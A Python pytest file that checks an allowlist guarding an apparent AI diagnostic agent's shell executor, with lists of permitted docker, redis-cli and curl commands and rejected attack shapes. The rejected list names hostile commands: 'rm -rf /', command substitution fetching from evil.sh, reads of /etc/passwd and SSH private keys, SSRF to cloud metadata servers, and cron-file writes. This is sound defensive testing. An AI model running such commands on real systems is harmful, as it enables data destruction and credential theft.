"""The diagnostic allowlist (src/security/allowlist.py) is the executor's main guardrail, so it is
tested from both sides:

* ALLOWED: every command the agent needs to diagnose the 5 seeded faults, plus the fixed
  check_health curl, must pass. If one of these fails, the agent can't do its job.
* REJECTED: a list of real attack shapes (prompt-injected commands, SSRF, escapes, flag tricks)
  must be refused with a specific rule_id. If one of these passes, that's a security bug.
"""

import random
from pathlib import Path

import pytest
import yaml

from security import CommandValidator, load_policy

REPO = Path(__file__).resolve().parents[1]
V = CommandValidator()

ALLOWED = [
    # overview
    (["docker", "ps"], "docker.ps"),
    (["docker", "ps", "-a"], "docker.ps"),
    (["docker", "ps", "--all", "--no-trunc"], "docker.ps"),
    (["docker", "stats", "--no-stream"], "docker.stats"),
    (["docker", "stats", "--no-stream", "ir-target-db-1", "ir-target-cache-1"], "docker.stats"),
    # logs (every fault leaves traces here)
    (["docker", "logs", "--tail", "200", "ir-target-api-1"], "docker.logs"),
    (["docker", "logs", "--tail=50", "ir-target-proxy-1"], "docker.logs"),
    (["docker", "logs", "ir-target-api-1", "-n", "100"], "docker.logs"),
    (["docker", "logs", "--since", "15m", "-t", "ir-target-db-1"], "docker.logs"),
    # inspect: state, restart count, env (api-bad-db-url-01), image tag (api-bad-image-01)
    (["docker", "inspect", "ir-target-api-1"], "docker.inspect"),
    (["docker", "inspect", "ir-target-db-1", "ir-target-cache-1"], "docker.inspect"),
    # inside containers (cache-maxmemory-01, db-stopped-01, proxy-bad-upstream-01)
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "PING"], "redis.ping"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "INFO", "memory"], "redis.info"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "info"], "redis.info"),
    (
        ["docker", "exec", "ir-target-cache-1", "redis-cli", "CONFIG", "GET", "maxmemory"],
        "redis.config_get",
    ),
    (
        ["docker", "exec", "ir-target-cache-1", "redis-cli", "config", "get", "maxmemory-policy"],
        "redis.config_get",
    ),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "DBSIZE"], "redis.dbsize"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "MEMORY", "STATS"], "redis.memory_stats"),
    (["docker", "exec", "ir-target-db-1", "pg_isready", "-U", "app", "-d", "app"], "pg_isready"),
    (["docker", "exec", "ir-target-db-1", "pg_isready"], "pg_isready"),
    (["docker", "exec", "ir-target-proxy-1", "nginx", "-T"], "nginx.test_config"),
    # host
    (
        ["curl", "-fsS", "--max-time", "5", "http://127.0.0.1:8088/health"],
        "curl.get",
    ),  # check_health
    (["curl", "-s", "-i", "http://127.0.0.1:8088/health"], "curl.get"),
    (["cat", "runtime/nginx.conf"], "cat"),
    (["cat", "runtime/api.env", "runtime/stack.env"], "cat"),
    (["df", "-h"], "df"),
    (["free", "-m"], "free"),
    (["uptime"], "uptime"),
]


@pytest.mark.parametrize(
    ("argv", "rule_id"), ALLOWED, ids=lambda x: " ".join(x) if isinstance(x, list) else x
)
def test_needed_commands_are_allowed(argv, rule_id):
    d = V.check(argv)
    assert d.allowed, d.reason
    assert d.rule_id == rule_id
    assert d.argv == tuple(argv)


REJECTED = [
    # --- not argv / encoding tricks ---
    ([], "argv.empty"),
    (["docker", "ps;", "rm", "-rf", "/"], "argv.charset"),
    (["sh", "-c", "docker ps"], "argv.charset"),  # space inside an argument
    (["docker", "logs", "ir-target-api-1\n--follow"], "argv.charset"),
    (["docker", "logs", "$(curl evil.sh)"], "argv.charset"),
    (["cat", "runtime/nginx.conf`id`"], "argv.charset"),
    (["docker", "logs", "ir‑target‑api‑1"], "argv.charset"),  # unicode hyphens (homoglyphs)
    (["cat", "runtime/../../etc/passwd"], "argv.path"),
    (["x"] * 33, "argv.too_long"),
    (["docker", "logs", "a" * 600], "argv.arg_too_long"),
    # --- binaries ---
    (["sh", "-c", "id"], "binary.not_allowed"),
    (["bash"], "binary.not_allowed"),
    (["rm", "-rf", "/"], "binary.not_allowed"),
    (["python3", "-c", "1"], "binary.not_allowed"),
    (["/usr/bin/docker", "ps"], "binary.path"),
    (["./docker", "ps"], "binary.path"),
    # --- docker: other daemons, writes, escapes ---
    (["docker", "-H", "tcp://10.0.0.9:2375", "ps"], "docker.global_flag"),
    (["docker", "--context", "prod", "ps"], "docker.global_flag"),
    (["docker", "rm", "-f", "ir-target-db-1"], "docker.subcommand"),
    (["docker", "stop", "ir-target-db-1"], "docker.subcommand"),
    (
        ["docker", "restart", "ir-target-api-1"],
        "docker.subcommand",
    ),  # changes = remediation, needs approval
    (["docker", "run", "--privileged", "-v", "/:/host", "alpine"], "docker.subcommand"),
    (["docker", "cp", "ir-target-db-1:/etc/passwd", "."], "docker.subcommand"),
    (["docker", "compose", "down"], "docker.subcommand"),
    (["docker", "ps", "--format", "x"], "docker.flag"),
    (["docker", "inspect", "--format", "x", "ir-target-api-1"], "docker.flag"),
    (["docker", "logs", "--follow", "ir-target-api-1"], "docker.follow"),
    (["docker", "logs", "-f", "ir-target-api-1"], "docker.follow"),
    (["docker", "logs", "--tail", "99999", "ir-target-api-1"], "docker.flag_value"),
    (["docker", "logs", "--tail", "-5", "ir-target-api-1"], "docker.flag_value"),
    (["docker", "logs", "--since", "999h", "ir-target-api-1"], "docker.flag_value"),
    (["docker", "logs", "--tail", "5", "--tail", "6", "ir-target-api-1"], "docker.flag_duplicate"),
    (["docker", "logs", "--tail"], "docker.flag_value"),
    (["docker", "logs", "some-other-container"], "docker.container"),
    (["docker", "logs", "--", "ir-target-api-1"], "docker.flag"),
    (["docker", "logs", "ir-target-api-1", "ir-target-db-1"], "docker.args"),
    (["docker", "stats"], "docker.args"),
    (["docker", "inspect", "host-container"], "docker.container"),
    # --- docker exec: shells, users, other programs ---
    (["docker", "exec", "ir-target-api-1", "sh"], "docker.exec_program"),
    (
        ["docker", "exec", "-u", "root", "ir-target-cache-1", "redis-cli", "PING"],
        "docker.exec_flag",
    ),
    (["docker", "exec", "--privileged", "ir-target-db-1", "pg_isready"], "docker.exec_flag"),
    (["docker", "exec", "ir-target-cache-1", "sh", "-c", "id"], "docker.exec_program"),
    (["docker", "exec", "ir-target-cache-1", "sh"], "docker.exec_program"),
    (["docker", "exec", "ir-target-db-1", "psql", "-c", "DROP"], "docker.exec_program"),
    (
        ["docker", "exec", "ir-target-db-1", "redis-cli", "PING"],
        "docker.exec_program",
    ),  # wrong container
    (["docker", "exec", "ir-target-cache-1"], "docker.exec_program"),
    # --- redis-cli: writes, other servers, scripts ---
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "FLUSHALL"], "redis.command"),
    (
        ["docker", "exec", "ir-target-cache-1", "redis-cli", "CONFIG", "SET", "maxmemory", "0"],
        "redis.command",
    ),
    (
        ["docker", "exec", "ir-target-cache-1", "redis-cli", "CONFIG", "GET", "requirepass"],
        "redis.config_param",
    ),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "-h", "10.0.0.9", "PING"], "redis.flag"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "--eval", "x.lua"], "redis.flag"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "EVAL", "return", "0"], "redis.command"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "KEYS", "x"], "redis.command"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "INFO", "all", "x"], "redis.args"),
    (["docker", "exec", "ir-target-cache-1", "redis-cli", "PING", "extra"], "redis.args"),
    # --- pg_isready / nginx ---
    (["docker", "exec", "ir-target-db-1", "pg_isready", "-h", "10.0.0.9"], "pg_isready.flag"),
    (["docker", "exec", "ir-target-db-1", "pg_isready", "-U", "postgres"], "pg_isready.flag_value"),
    (["docker", "exec", "ir-target-proxy-1", "nginx", "-s", "stop"], "nginx.args"),
    (["docker", "exec", "ir-target-proxy-1", "nginx", "-c", "/tmp/evil.conf"], "nginx.args"),
    # --- curl: SSRF, writes, headers ---
    (["curl", "http://169.254.169.254/computeMetadata/v1/"], "curl.url"),  # GCE metadata server
    (["curl", "http://metadata.google.internal/computeMetadata/v1/"], "curl.url"),
    (["curl", "-H", "Metadata-Flavor:Google", "http://127.0.0.1:8088/health"], "curl.flag"),
    (["curl", "http://127.0.0.1:8088/health", "-o", "/etc/cron.d/x"], "curl.flag"),
    (["curl", "-X", "POST", "http://127.0.0.1:8088/visits"], "curl.flag"),
    (["curl", "-d", "x", "http://127.0.0.1:8088/health"], "curl.flag"),
    (["curl", "-K", "cfg", "http://127.0.0.1:8088/health"], "curl.flag"),
    (["curl", "-L", "http://127.0.0.1:8088/health"], "curl.flag"),
    (["curl", "--url", "http://169.254.169.254/"], "curl.flag"),
    (["curl", "file:///etc/passwd"], "curl.url"),
    (["curl", "http://127.0.0.1:8088/health@169.254.169.254"], "argv.charset"),
    (["curl", "http://127.0.0.1:8088/health/../visits"], "argv.path"),
    (["curl", "http://127.0.0.1:8088/health", "http://127.0.0.1:8088/health"], "curl.url"),
    (["curl", "--max-time", "999", "http://127.0.0.1:8088/health"], "curl.flag_value"),
    (["curl", "-fsSo", "x", "http://127.0.0.1:8088/health"], "curl.flag"),  # -o hidden in a combo
    # --- cat / host tools ---
    (["cat", "/etc/passwd"], "cat.file"),
    (["cat", "known-good/nginx.conf"], "cat.file"),  # would give away the answer
    (["cat", "/root/.ssh/id_rsa"], "cat.file"),
    (["cat", "-A", "runtime/nginx.conf"], "cat.flag"),
    (["cat"], "cat.args"),
    (["df", "-h", "/"], "df.args"),
    (["uptime", "-p"], "uptime.args"),
]


@pytest.mark.parametrize(
    ("argv", "rule_id"), REJECTED, ids=lambda x: " ".join(x)[:60] if isinstance(x, list) else x
)
def test_attacks_are_rejected_with_the_right_rule(argv, rule_id):
    d = V.check(argv)
    assert not d.allowed, f"SECURITY: {argv} was allowed"
    assert d.rule_id == rule_id, d.reason
    assert d.reason and d.reason != "allowed"


@pytest.mark.parametrize("bad", [None, "docker ps", 42, [None], [1, 2], ["docker", 5], [""]])
def test_non_argv_input_never_raises(bad):
    d = V.check(bad)
    assert not d.allowed


def test_random_argv_never_raises_and_never_allows_unknown_binaries():
    # A cheap fuzz: random tokens from the allowed charset plus a few hostile ones.
    rng = random.Random(599)
    pool = [
        "docker",
        "curl",
        "cat",
        "exec",
        "logs",
        "-f",
        "--tail",
        "5",
        "ir-target-api-1",
        "redis-cli",
        "INFO",
        "-h",
        "x",
        "runtime/api.env",
        "http://127.0.0.1:8088/health",
        "sh",
        "-c",
        "rm",
        "/",
        "..",
        ";",
        "$",
        "--",
        "=",
        "-fsS",
    ]
    for _ in range(5000):
        argv = [rng.choice(pool) for _ in range(rng.randint(1, 8))]
        d = V.check(argv)  # must not raise
        if d.allowed:
            assert argv[0] in {"docker", "curl", "cat"}
            assert "sh" not in argv and "rm" not in argv and ";" not in argv


def test_every_rejection_has_a_rule_id():
    for argv, _ in REJECTED:
        assert V.check(argv).rule_id


def test_policy_containers_match_compose_services():
    """If someone renames or adds a service in target/docker-compose.yml, this fails until the
    allowlist is updated on purpose: no container falls in or out of scope silently."""
    compose = yaml.safe_load((REPO / "target" / "docker-compose.yml").read_text())
    expected = {f"{compose['name']}-{svc}-1" for svc in compose["services"]}
    assert set(load_policy().containers) == expected


def test_readable_files_exist_in_known_good():
    # runtime/ is a copy of known-good/, so every readable runtime file must have a known-good twin.
    for rel in load_policy().readable_files:
        assert rel.startswith("runtime/")
        assert (REPO / "target" / "known-good" / rel.removeprefix("runtime/")).is_file(), rel


def test_metadata_server_is_never_allowed():
    for url in load_policy().curl.urls:
        assert "169.254" not in url and "metadata" not in url


def test_summary_mentions_everything_allowed():
    s = V.summary()
    policy = load_policy()
    for item in (*policy.containers, *policy.curl.urls, *policy.readable_files):
        assert item in s
    assert "known-good" not in s


def test_policy_rejects_unknown_keys(tmp_path):
    p = tmp_path / "bad.yaml"
    data = yaml.safe_load((REPO / "src" / "security" / "allowlist.yaml").read_text())
    data["allow_everything"] = True
    p.write_text(yaml.safe_dump(data))
    with pytest.raises(ValueError):
        load_policy(p)


def test_exec_rules_must_name_known_containers(tmp_path):
    p = tmp_path / "bad.yaml"
    data = yaml.safe_load((REPO / "src" / "security" / "allowlist.yaml").read_text())
    data["exec"]["some-host-container"] = {"nginx": {"flags": ["-T"]}}
    p.write_text(yaml.safe_dump(data))
    with pytest.raises(ValueError, match="not in `containers`"):
        load_policy(p)
